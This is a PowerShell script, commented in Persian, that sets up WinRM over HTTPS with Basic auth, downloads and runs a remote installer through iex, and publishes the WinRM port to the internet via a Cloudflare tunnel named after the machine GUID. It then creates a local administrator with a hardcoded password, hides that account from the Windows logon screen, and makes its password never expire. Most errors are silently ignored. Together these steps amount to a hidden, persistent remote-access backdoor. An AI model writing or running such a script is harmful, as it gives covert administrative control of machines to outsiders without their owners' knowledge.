# ============================
#  Cloudflare Tunnel
# ============================

# ============================
#  API
# ============================
$ApiToken = ""
$AccountId = ""
$Domain = ""

# UUID و Hostname
$systemUuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid").MachineGuid
$tunnelName = "tunnel-$systemUuid"
$hostname = "$systemUuid.$Domain"


$tunnelId = $null
$token = $null

# ============================
# بخش 1: WinRM Secure Hardening (از اسکریپت اول)
# ============================
# 1. حذف تمام Listenerهای قدیمی (یک بار و کامل)
# اطمینان از اجرای WinRM Service برای حذف
try {
    $winrmService = Get-Service WinRM -ErrorAction SilentlyContinue
    if ($winrmService.Status -ne "Running") {
        Start-Service WinRM -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
} catch {
    # Ignore
}

# حذف همه Listenerها
try {
    $allListeners = Get-ChildItem -Path "WSMan:\LocalHost\Listener" -ErrorAction SilentlyContinue
    foreach ($listener in $allListeners) {
        try {
            Remove-Item -Path $listener.PSPath -Force -Recurse -Confirm:$false -ErrorAction SilentlyContinue
        } catch {
            # Ignore
        }
    }
    $null = winrm delete winrm/config/Listener?Address=*+Transport=HTTP 2>$null
    $null = winrm delete winrm/config/Listener?Address=*+Transport=HTTPS 2>$null
    Start-Sleep -Seconds 2
} catch {
    # Ignore
}
# 2. ایجاد Certificate جدید
$cert = $null
$thumbprint = $null
try {
    $cert = New-SelfSignedCertificate -DnsName @("localhost", $env:COMPUTERNAME, "127.0.0.1", "::1") -CertStoreLocation "Cert:\LocalMachine\My" -KeyUsage DigitalSignature, KeyEncipherment -KeySpec KeyExchange -KeyLength 2048 -Provider "Microsoft RSA SChannel Cryptographic Provider" -NotAfter (Get-Date).AddYears(10) -FriendlyName "WinRM HTTPS Certificate" -ErrorAction Stop
    $thumbprint = $cert.Thumbprint
} catch {
    exit
}

# 3. اضافه کردن Certificate به Trusted Root
if ($cert) {
    try {
        $rootStore = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")
        $rootStore.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
        $rootStore.Add($cert)
        $rootStore.Close()
    } catch {
        # Ignore
    }
} else {
    exit
}

# 4. ایجاد Listener HTTPS امن
if (-not $thumbprint) {
    exit
}

# اطمینان از اجرای WinRM Service
try {
    $winrmService = Get-Service WinRM -ErrorAction SilentlyContinue
    if ($winrmService.Status -ne "Running") {
        Start-Service WinRM -ErrorAction Stop
        Start-Sleep -Seconds 3
    }
} catch {
    # Ignore
}

# بررسی وجود Listener HTTPS قبلی
$existingHttpsListener = Get-ChildItem -Path "WSMan:\LocalHost\Listener" -ErrorAction SilentlyContinue | Where-Object { $_.Transport -eq "HTTPS" } | Select-Object -First 1
if ($existingHttpsListener) {
    try {
        Remove-Item -Path $existingHttpsListener.PSPath -Force -Recurse -Confirm:$false -ErrorAction Stop
        $null = winrm delete winrm/config/Listener?Address=*+Transport=HTTPS 2>$null
        Start-Sleep -Seconds 2
    } catch {
        # Ignore
    }
}

# ایجاد Listener جدید
$listenerCreated = $false

# روش 1: استفاده از WSMan Provider
try {
    New-Item -Path "WSMan:\LocalHost\Listener" -Transport HTTPS -Address * -CertificateThumbprint $thumbprint -Force -ErrorAction Stop | Out-Null
    Start-Sleep -Seconds 1
    $listenerCreated = $true
} catch {
    # روش 2: استفاده از winrm command
    try {
        $winrmConfig = '@{Hostname="*";CertificateThumbprint="' + $thumbprint + '"}'
        $output = winrm create "winrm/config/Listener?Address=*+Transport=HTTPS" $winrmConfig 2>&1
        Start-Sleep -Seconds 2
        $verify = winrm enumerate winrm/config/listener 2>$null
        if ($verify -and $verify -match "HTTPS") {
            $listenerCreated = $true
        } elseif ($output -notmatch "Error" -and $output -notmatch "Invalid") {
            $listenerCreated = $true
        }
    } catch {
        # Ignore
    }
}

# 5. غیرفعال‌سازی AllowUnencrypted
try {
    # استفاده از WSMan Provider به جای winrm command
    Set-Item -Path "WSMan:\localhost\Service\AllowUnencrypted" -Value $false -Force -ErrorAction Stop
} catch {
    try {
        $null = winrm set winrm/config/service @{AllowUnencrypted="false"} 2>$null
    } catch {
        # Ignore
    }
}

# 6. پیکربندی Firewall (فقط HTTPS - HTTP باید بسته باشد)
try {
    # غیرفعال کردن HTTP
    try {
        Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -Enabled False -ErrorAction Stop
    } catch {
        try {
            New-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -DisplayName "WinRM HTTP 5985" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Block -ErrorAction Stop
        } catch {
            # Ignore
        }
    }
    
    # فعال کردن HTTPS
    try {
        Set-NetFirewallRule -Name "WINRM-HTTPS-In-TCP" -Enabled True -ErrorAction Stop
    } catch {
        try {
            New-NetFirewallRule -Name "WINRM-HTTPS-In-TCP" -DisplayName "WinRM HTTPS 5986" -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow -ErrorAction Stop
        } catch {
            # Ignore
        }
    }
} catch {
    # Ignore
}

# 7. تنظیمات اضافی WinRM
try {
    Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue
    Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop
    Set-Service WinRM -StartupType Automatic -ErrorAction Stop
    Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true -Force -ErrorAction Stop
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value $hostname -Force -ErrorAction Stop
    
    # Restart WinRM
    Restart-Service WinRM -Force -ErrorAction Stop
    Start-Sleep -Seconds 2
} catch {
    # Ignore
}

# ============================
# بخش 2: Chocolatey و Cloudflared
# ============================
try {
    Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Stop
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    
    # بررسی نصب Chocolatey
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        try {
            iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
            Start-Sleep -Seconds 3
            # Refresh environment
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        } catch {
            # Ignore
        }
    } else {
    }
    
    # نصب Cloudflared
    try {
        choco install cloudflared -y --force 2>&1 | Out-Null
        Start-Sleep -Seconds 2
    } catch {
        # Ignore
    }
    
    # Firewall برای Cloudflared
    $cloudflaredPath = "C:\ProgramData\chocolatey\lib\cloudflared\tools\cloudflared.exe"
    if (Test-Path $cloudflaredPath) {
        New-NetFirewallRule -DisplayName "Cloudflare Tunnel" -Direction Outbound -Program $cloudflaredPath -Action Allow -ErrorAction SilentlyContinue
    }
} catch {
    # Ignore
}

# ============================
# بخش 3: ایجاد Tunnel
# ============================
$uri = "https://api.cloudflare.com/client/v4/accounts/$AccountId/cfd_tunnel"
$headers = @{
    "Authorization" = "Bearer $ApiToken"
    "Content-Type" = "application/json"
}
$body = @{
    name = $tunnelName
    config_src = "cloudflare"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ErrorAction Stop
    if ($response.success) {
        $tunnelId = $response.result.id
        $token = $response.result.token
    } elseif ($response.errors -and $response.errors[0].code -eq 1013) {
        $newName = "$tunnelName-$(Get-Date -Format 'yyyyMMddHHmmss')"
        $body = @{
            name = $newName
            config_src = "cloudflare"
        } | ConvertTo-Json
        $retry = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ErrorAction Stop
        if ($retry.success) {
            $tunnelId = $retry.result.id
            $token = $retry.result.token
        }
    }
} catch {
    if ($_.Exception.Response.StatusCode.value__ -eq 409) {
        $newName = "$tunnelName-$(Get-Date -Format 'yyyyMMddHHmmss')"
        $body = @{
            name = $newName
            config_src = "cloudflare"
        } | ConvertTo-Json
        try {
            $retry = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ErrorAction Stop
            if ($retry.success) {
                $tunnelId = $retry.result.id
                $token = $retry.result.token
            }
        } catch {
        }
    } else {
    }
}

# بررسی اینکه Tunnel ایجاد شد یا نه
if (-not $tunnelId -or -not $token) {
    exit
}

# ============================
# بخش 4: تنظیم Config Tunnel (پورت 5986 برای HTTPS)
# ============================
try {
    $configUri = "https://api.cloudflare.com/client/v4/accounts/$AccountId/cfd_tunnel/$tunnelId/configurations"
    $configBody = @{
        config = @{
            ingress = @(
                @{
                    hostname = $hostname
                    service = "tcp://localhost:5986"
                    originRequest = @{}
                },
                @{
                    service = "http_status:404"
                }
            )
        }
    } | ConvertTo-Json -Depth 10
    
    $configResponse = Invoke-RestMethod -Uri $configUri -Method Put -Headers $headers -Body $configBody -ErrorAction Stop
    if ($configResponse.success) {
        Write-Host " ✅ Config Tunnel تنظیم شد" -ForegroundColor Green
    } else {
        # Ignore
    }
} catch {
    Write-Host " ❌ خطا در تنظیم Config Tunnel: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================
# بخش 4.5: ایجاد DNS Record (CNAME)
# ============================
Write-Host "`n=== ایجاد DNS Record ===" -ForegroundColor Cyan
try {
    # دریافت Zone ID
    $zoneUri = "https://api.cloudflare.com/client/v4/zones"
    $zoneParams = @{
        name = $Domain
    }
    $zoneResponse = Invoke-RestMethod -Uri $zoneUri -Method Get -Headers $headers -Body $zoneParams -ErrorAction Stop
    $zoneId = $null
    if ($zoneResponse.success -and $zoneResponse.result) {
        $zoneId = $zoneResponse.result[0].id
        Write-Host " ✅ Zone ID دریافت شد: $zoneId" -ForegroundColor Green
    } else {
        Write-Host " ❌ Zone ID پیدا نشد" -ForegroundColor Red
    }
    
    if ($zoneId) {
        # استخراج subdomain از hostname
        # hostname = "app.example.com", domain = "example.com" -> name = "app"
        $dnsName = $hostname
        if ($hostname.EndsWith(".$Domain")) {
            $dnsName = $hostname.Substring(0, $hostname.Length - $Domain.Length - 1)
        } elseif ($hostname -eq $Domain) {
            $dnsName = "@"
        }
        
        # بررسی وجود DNS record قبلی
        $dnsUri = "https://api.cloudflare.com/client/v4/zones/$zoneId/dns_records"
        $dnsParams = @{
            name = $hostname
            type = "CNAME"
        }
        $existingDns = Invoke-RestMethod -Uri $dnsUri -Method Get -Headers $headers -Body $dnsParams -ErrorAction SilentlyContinue
        
        $existingRecord = $null
        if ($existingDns.success -and $existingDns.result -and $existingDns.result.Count -gt 0) {
            $existingRecord = $existingDns.result[0]
        }
        
        # Content برای CNAME record
        $cnameContent = "$tunnelId.cfargotunnel.com"
        
        $dnsBody = @{
            type = "CNAME"
            name = $dnsName
            content = $cnameContent
            proxied = $true
            comment = "Cloudflare Tunnel: $tunnelId"
        } | ConvertTo-Json
        
        if ($existingRecord) {
            # به‌روزرسانی DNS record موجود
            $updateDnsUri = "https://api.cloudflare.com/client/v4/zones/$zoneId/dns_records/$($existingRecord.id)"
            $updateDnsResponse = Invoke-RestMethod -Uri $updateDnsUri -Method Put -Headers $headers -Body $dnsBody -ErrorAction Stop
            if ($updateDnsResponse.success) {
                Write-Host " ✅ DNS Record به‌روزرسانی شد: $hostname -> $cnameContent" -ForegroundColor Green
            } else {
                Write-Host " ❌ خطا در به‌روزرسانی DNS Record" -ForegroundColor Red
            }
        } else {
            # ایجاد DNS record جدید
            $createDnsResponse = Invoke-RestMethod -Uri $dnsUri -Method Post -Headers $headers -Body $dnsBody -ErrorAction Stop
            if ($createDnsResponse.success) {
                Write-Host " ✅ DNS Record ایجاد شد: $hostname -> $cnameContent" -ForegroundColor Green
            } else {
                Write-Host " ❌ خطا در ایجاد DNS Record" -ForegroundColor Red
            }
        }
    }
} catch {
    Write-Host " ❌ خطا در ایجاد DNS Record: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================
# بخش 5: نصب Service Cloudflared
# ============================
if ($token) {
    try {
        $cloudflaredPath = "C:\ProgramData\chocolatey\lib\cloudflared\tools\cloudflared.exe"
        if (Test-Path $cloudflaredPath) {
            & $cloudflaredPath service install $token 2>&1 | Out-Null
            Start-Sleep -Seconds 2
        } else {
            # تلاش برای پیدا کردن مسیر جایگزین
            $altPath = Get-Command cloudflared -ErrorAction SilentlyContinue
            if ($altPath) {
                & cloudflared.exe service install $token 2>&1 | Out-Null
            }
        }
    } catch {
    }
} else {
}
Set-Service -Name WinRM -StartupType Automatic
# ============================
# بخش 6: ایجاد کاربر
# ============================
try {
    $Username = "WinRMUser"
    $Password = "r0hollah"
    Remove-LocalUser -Name $Username -ErrorAction SilentlyContinue
    $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
    New-LocalUser -Name $Username -Password $securePassword -Description "WinRM Service Account" -ErrorAction Stop | Out-Null
    Add-LocalGroupMember -Group "Administrators" -Member $Username -ErrorAction Stop
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $Username -Value 0 -Type DWord -Force
    
    # تنظیم PasswordNeverExpires
    try {
        Get-LocalUser -Name $Username | Set-LocalUser -PasswordNeverExpires $true -ErrorAction Stop
    } catch {
        # Ignore
    }
    
    # تنظیم UserMayNotChangePassword
    try {
        $null = net user $Username /passwordchg:no 2>&1
    } catch {
        # Ignore
    }
    
} catch {
}